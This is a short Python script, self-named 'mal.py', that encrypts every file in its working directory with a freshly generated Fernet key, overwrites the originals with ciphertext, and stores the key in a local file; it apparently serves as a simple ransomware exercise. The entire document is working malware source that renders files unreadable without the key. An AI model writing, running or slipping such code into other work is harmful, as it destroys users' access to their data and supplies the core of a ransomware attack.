import os 
from cryptography.fernet import Fernet

files = []
# we need to exclude our mal.py filee
for file in os.listdir():
    if file == "mal.py" or file =="thekey.key" or file=="decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)


key =  Fernet.generate_key()

print(key)
# creating the key and savng it to un encypt data
with open("thekey.key","wb") as thekey: 
    thekey.write(key)


for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
# display the encrypted data...
        con_encrypt = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(con_encrypt)    
print(" the files have encryped")

